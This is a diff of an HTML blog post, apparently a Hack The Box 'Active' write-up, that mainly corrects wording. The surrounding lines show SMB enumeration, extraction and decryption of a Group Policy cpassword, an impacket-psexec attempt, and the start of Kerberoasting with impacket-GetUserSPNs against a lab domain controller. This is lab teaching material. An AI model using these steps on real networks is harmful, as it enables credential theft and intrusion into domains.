@@ -80,7 +80,7 @@ Host script results:
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Mon Dec 19 18:49:49 2022 -- 1 IP address (1 host up) scanned in 737.12 seconds
-</pre></table></code></div></div><p>The above result shows different ports open and we can check them, lets start with <code class="language-plaintext highlighter-rouge">smb</code></p><h3 id="enumerate-smb">Enumerate smb</h3><p>Since <code class="language-plaintext highlighter-rouge">smb</code> service is open then we can run <code class="language-plaintext highlighter-rouge">smbmap</code> to check the files and permissions in the service <strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>The above result shows different ports open and we can check them, lets start with <code class="language-plaintext highlighter-rouge">smb</code></p><h3 id="enumerate-smb">Enumerate smb</h3><p>We can run <code class="language-plaintext highlighter-rouge">smbmap</code> to check the files and permissions in the service <strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -104,7 +104,7 @@ Service detection performed. Please report any incorrect results at https://nmap
         Replication                                             READ ONLY
         SYSVOL                                                  NO ACCESS       Logon server share 
         Users                                                   NO ACCESS
-</pre></table></code></div></div><p>After testing to access the above results the only promising was <code class="language-plaintext highlighter-rouge">Replication</code></p><p>Another thing is <code class="language-plaintext highlighter-rouge">smbmap</code> has an ability to list things in recursive mode and by this we can check all the <code class="language-plaintext highlighter-rouge">Replication</code> directory to see if there anything interesting.</p><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>After testing to access the smb the only promising content was <code class="language-plaintext highlighter-rouge">Replication</code> directory.</p><p>Another thing is <code class="language-plaintext highlighter-rouge">smbmap</code> has an ability to list things in recursive mode and by this we can check all the <code class="language-plaintext highlighter-rouge">Replication</code> directory to see if there anything interesting.</p><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/active]
 └─$ smbmap -H 10.10.10.100 -R Replication
@@ -120,7 +120,7 @@ Service detection performed. Please report any incorrect results at https://nmap
   Groups.xml                          A      533  Wed Jul 18 23:46:06 2018
 
                 5217023 blocks of size 4096. 244870 blocks available
-</pre></table></code></div></div><p>I download the <code class="language-plaintext highlighter-rouge">Gropus.xml</code> file which is <code class="language-plaintext highlighter-rouge">Group Policy</code> file with local account users information it was very common in <code class="language-plaintext highlighter-rouge">2008</code> Windows Serve. I downloaded the file into my Linux machine by using <code class="language-plaintext highlighter-rouge">get</code> command and it contains the followings:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>I downloaded <code class="language-plaintext highlighter-rouge">Gropus.xml</code> file which is <code class="language-plaintext highlighter-rouge">Group Policy</code> file with local account users information, it was very common in <code class="language-plaintext highlighter-rouge">2008</code> Windows Server. I downloaded the file into my Linux machine by using <code class="language-plaintext highlighter-rouge">get</code> command and it contains the followings contents:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -138,7 +138,7 @@ Service detection performed. Please report any incorrect results at https://nmap
         <span class="na">changeLogon=</span><span class="s">"0"</span> <span class="na">noChange=</span><span class="s">"1"</span> <span class="na">neverExpires=</span><span class="s">"1"</span> <span class="na">acctDisabled=</span><span class="s">"0"</span> <span class="na">userName=</span><span class="s">"active.htb\SVC_TGS"</span><span class="nt">/&gt;</span>
     <span class="nt">&lt;/User&gt;</span>
 <span class="nt">&lt;/Groups&gt;</span>
-</pre></table></code></div></div><p>The important details are <code class="language-plaintext highlighter-rouge">username : active.htb\SVC_TGS</code> and <code class="language-plaintext highlighter-rouge">cpassowrd : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqhgit+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p><h3 id="crack-the-password">Crack the Password</h3><p>To crack this kind of password the tool known as <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> can be used</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>The important details are <code class="language-plaintext highlighter-rouge">username : active.htb\SVC_TGS</code> and <code class="language-plaintext highlighter-rouge">cpassowrd : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqhgit+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p><p>Then since we have <code class="language-plaintext highlighter-rouge">username</code> then we can try to crack his <code class="language-plaintext highlighter-rouge">password</code></p><h3 id="cracking-the-password">Cracking the Password</h3><p>To crack this kind of password the tool known as <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> can be used</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 </pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/active]
@@ -168,7 +168,7 @@ Administrator                                         2018-07-18 22:06:40.351723
 Guest                                                 &lt;never&gt;              &lt;never&gt;             
 krbtgt                                                2018-07-18 21:50:36.972031  &lt;never&gt;             
 SVC_TGS                                               2018-07-18 23:14:38.402764  2018-07-21 17:01:30.320277 
-</pre></table></code></div></div><p>I tried to login by using <code class="language-plaintext highlighter-rouge">impacket=psexec</code> but it failed due to reason that user <code class="language-plaintext highlighter-rouge">svc_tgs</code> is not <code class="language-plaintext highlighter-rouge">administrator</code> but since we have credentials we can use <code class="language-plaintext highlighter-rouge">smbmap</code> to check what this user can do</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>I tried to login by using <code class="language-plaintext highlighter-rouge">impacket-psexec</code> but it failed due to reason that user <code class="language-plaintext highlighter-rouge">svc_tgs</code> is not <code class="language-plaintext highlighter-rouge">administrator</code> but since we have credentials we can use <code class="language-plaintext highlighter-rouge">smbmap</code> to check what this user can do</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -210,7 +210,7 @@ getting file \svc_tgs\desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec
 d0d2d6a0c7******
 </pre></table></code></div></div><h2 id="administrator-account">Administrator Account</h2><h3 id="kerberosting">Kerberosting</h3><p>Lets try <code class="language-plaintext highlighter-rouge">impacket-GetUserSPNs</code> to see if <code class="language-plaintext highlighter-rouge">active\Administrator</code> account has been configured with a <code class="language-plaintext highlighter-rouge">SPN</code>.</p><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
-</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/active]                                                                                                                                      
+</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/active]
 └─$ impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request 
 </pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
